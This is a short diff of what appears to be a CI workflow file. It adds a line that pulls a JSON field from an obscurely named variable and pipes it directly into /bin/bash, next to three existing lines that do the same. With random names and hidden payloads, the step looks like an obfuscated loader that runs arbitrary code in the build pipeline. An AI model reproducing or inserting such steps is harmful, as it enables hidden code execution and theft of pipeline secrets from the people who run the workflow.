@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$np81049" | jq -r .e0 | /bin/bash
           echo $rxfct7 | jq -r .yifm7 | /bin/bash
           printf '%s' "$n96" | jq -r .pi0 | /bin/bash
+          echo $jmww08 | jq -r .xx45531 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
